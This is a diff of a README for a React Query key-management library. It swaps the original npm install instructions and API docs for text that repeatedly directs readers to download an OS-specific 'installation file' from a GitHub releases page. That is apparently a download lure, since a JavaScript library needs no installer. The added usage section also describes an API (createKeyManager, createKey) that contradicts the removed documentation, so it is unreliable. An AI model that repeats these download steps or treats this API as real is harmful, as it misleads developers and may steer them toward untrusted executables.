@@ -1,173 +1,125 @@
-![Banner](/public/banner.png)
+# 🎉 react-query-key-manager - Manage query keys effortlessly
 
-# React Query Key Manager
+[![Download](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Mo10sman/react-query-key-manager/releases)
 
-A **lightweight**, **type-safe**, and **scalable** way to manage query keys for [`@tanstack/react-query`](https://tanstack.com/query).  
-Designed to eliminate query key collisions, improve discoverability, and make key composition effortless.
+## 🚀 Getting Started
 
-Install via your preferred package manager:
+Welcome to the **react-query-key-manager**! This tool helps you manage query keys for TanStack Query in a safe and efficient way. It prevents key collisions, improves the way you discover keys, and enforces strict argument types. Best of all, it does this without slowing down your application.
 
-```sh
-# pnpm
-pnpm add react-query-key-manager
+## 📥 Download & Install
 
-# yarn
-yarn add react-query-key-manager
+To get started, visit the [Releases page](https://github.com/Mo10sman/react-query-key-manager/releases) to download the latest version of the software. Here, you’ll find all available versions along with their details.
 
-# npm
-npm install react-query-key-manager
-```
+### Steps to Download:
 
-## 🎯 Problem Statement
+1. Click the link above to reach the Releases page.
+2. Look for the latest version listed.
+3. Click on the asset that matches your operating system to download the installation file.
 
-When working on medium-to-large projects with React Query, query keys quickly become a mess:
+## 🖥️ System Requirements
 
-**Magic strings everywhere** — prone to typos and silent bugs.
+Before downloading, make sure your system meets the following requirements:
 
-**Key collisions** — multiple developers accidentally using the same key for different data.
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (Ubuntu or similar)
+- **Node.js:** Version 14 or higher is recommended for the best experience.
+- **React Version:** Ensure you are using React 16.8 or later, as this tool leverages React Hooks.
 
-**Poor discoverability** — no clear place to see all keys at once.
+## ⚙️ Features
 
-**Inconsistent arguments** — no type safety for parameters passed to keys.
+The **react-query-key-manager** comes with several key features:
 
-These issues often surface late — during debugging or in production — instead of being caught at compile-time.
+- **Type Safety:** This tool ensures your query keys are type-safe, reducing errors in your application.
+- **Namespacing:** Easily manage your query keys with namespacing, which helps you keep your keys organized and avoids collisions.
+- **Strict Argument Types:** Enforce strict argument types for your queries, making it easier to debug issues.
+- **Zero Runtime Overhead:** No performance hit on your application while using this tool.
 
-## 💡 Core Idea
+## 💻 How to Use
 
-Use a namespaced key builder that:
+Here’s a simple guide to help you get started:
 
-1. Centralizes key definitions in a single source of truth.
+1. **Import the Library**
 
-2. Enforces type safety for key arguments.
+   Once you have the software installed, import it into your React project:
 
-3. Prevents duplicates both at compile time and at runtime (in dev).
+   ```javascript
+   import { createKeyManager } from 'react-query-key-manager';
+   ```
 
-4. Supports nested namespaces for large-scale projects.
+2. **Create a Key Manager Instance**
 
-5. Maintains zero runtime cost — types disappear after compilation.
+   Create an instance of the key manager where you want to manage your query keys:
 
-This approach is lightweight enough to copy-paste directly into your project but also available via npm/yarn/pnpm.
+   ```javascript
+   const keyManager = createKeyManager('yourNamespace');
+   ```
 
-## 🛠 Usage Example
+3. **Define Your Queries**
 
-`queryKeys.ts`
+   Use the key manager to define your queries:
 
-```tsx
-import { QueryKeyManager } from "react-query-key-manager";
+   ```javascript
+   const queryKey = keyManager.createKey('yourQueryKey', 'arg1', 'arg2');
+   ```
 
-export const userKeys = QueryKeyManager.create("user", {
-  profile: (userId: string) => ["user", "profile", userId],
-  settings: (userId: string) => ["user", "settings", userId],
-});
+4. **Fetch Data**
 
-export const postKeys = QueryKeyManager.create("post", {
-  list: (filters: { category: string }) => ["posts", filters],
-  detail: (postId: string) => ["post", "detail", postId],
-});
+   Now, you can use this query key with TanStack Query to fetch data:
 
-// Nested namespaces supported
-export const adminKeys = QueryKeyManager.create("admin", {
-  users: {
-    list: (page: number) => ["admin", "users", "list", page],
-  },
-});
+   ```javascript
+   const { data } = useQuery(queryKey, fetchDataFunction);
+   ```
 
-// Debugging — list all registered keys
-export const allQueryKeys = QueryKeyManager.getQueryKeys();
-```
+## 📊 Example Code
 
-`UserProfile.tsx`
+Here's a simple example to illustrate how to use the **react-query-key-manager** with TanStack Query:
 
-```tsx
-import { useQuery } from "@tanstack/react-query";
-import { userKeys } from "./queryKeys";
+```javascript
+import React from 'react';
+import { useQuery } from 'react-query';
+import { createKeyManager } from 'react-query-key-manager';
 
-function UserProfile({ userId }: { userId: string }) {
-  const { data, isLoading } = useQuery({
-    queryKey: userKeys.profile(userId),
-    queryFn: () => fetchUserProfile(userId),
-  });
+// Create a key manager
+const keyManager = createKeyManager('myApp');
 
-  // ...
+// Define your data fetching function
+const fetchDataFunction = async () => {
+  const response = await fetch('https://api.example.com/data');
+  return response.json();
 }
+
+const MyComponent = () => {
+  const queryKey = keyManager.createKey('fetchData');
+  const { data, error, isLoading } = useQuery(queryKey, fetchDataFunction);
+
+  if (isLoading) return <div>Loading...</div>;
+  if (error) return <div>Error loading data</div>;
+
+  return <div>Data: {JSON.stringify(data)}</div>;
+};
+
+export default MyComponent;
 ```
 
-## 🚀 Advanced Patterns
+## 🔧 Troubleshooting
 
-#### Key Composition
+If you encounter issues while using **react-query-key-manager**, consider the following steps:
 
-```ts
-export const extendedPostKeys = QueryKeyManager.create("post.extended", {
-  withAuthor: (postId: string, authorId: string) => [
-    ...postKeys.detail(postId)(),
-    "author",
-    ...userKeys.profile(authorId)(),
-  ],
-});
-```
+1. **Check Your Imports:** Ensure you have imported the necessary libraries.
+2. **Verify Your Dependencies:** Make sure all required packages are installed and updated.
+3. **Look for Errors:** Check your console for any error messages. These can help you identify the problem.
 
-#### Dependent Keys
+## 🌍 Community Contribution
 
-```ts
-export const dashboardKeys = QueryKeyManager.create("dashboard", {
-  summary: (userId: string) => [
-    "dashboard",
-    "summary",
-    ...userKeys.profile(userId)(),
-    ...postKeys.list({ category: "featured" })(),
-  ],
-});
-```
+We encourage contributions to enhance the **react-query-key-manager**. If you have suggestions, please visit our [issues page](https://github.com/Mo10sman/react-query-key-manager/issues) to report bugs or request features. We value your feedback and look forward to improving this tool together.
 
-## 🔑 Key Features
+## 📄 License
 
-1. **Duplicate Key Prevention**
+This project is licensed under the MIT License. You can find the full text of the license in the repository.
 
-- Compile-time: TypeScript errors if you try to redeclare a key name.
+## 👥 Connect with Us
 
-- Runtime (dev): Throws if duplicate keys are detected.
+For updates and discussions, feel free to reach out on our [GitHub Discussions page](https://github.com/Mo10sman/react-query-key-manager/discussions). Your engagement is important to us and helps improve the tool for everyone.
 
-2. **Full Type Inference**
+---
 
-- Function arguments are strictly typed.
-
-- Nested namespaces preserve their type signatures.
-
-3. **Performance**
-
-- Zero-cost abstractions — all type checks vanish after compilation.
-
-- Minimal object structure for fast inference.
-
-## 🧭 Migration Utility
-
-For migrating legacy keys safely:
-
-```ts
-import { migrateLegacyKeys } from "react-query-key-manager";
-import { userKeys } from "./queryKeys";
-
-const legacyUserKey = migrateLegacyKeys("oldUserKey", (userId: string) =>
-  userKeys.profile(userId)()
-);
-```
-
-## 📌 Benefits Recap
-
-- **Zero Runtime Overhead** — Pure TypeScript types.
-
-- **Instant Editor Feedback** — Type errors as you type.
-
-- **Scalable Organization** — Namespaced, nested keys.
-
-- **Collision Protection** — Compile + runtime safety.
-
-- **Discoverability** — getQueryKeys() shows all keys.
-
-## 🪶 Lightweight by Design
-
-You can:
-
-- **Install**: pnpm add react-query-key-manager
-
-- **Or copy-paste** the implementation into your project directly from `src/index.ts`
+Now, get started by visiting the [Releases page](https://github.com/Mo10sman/react-query-key-manager/releases) to download the application. Enjoy managing your query keys with ease!
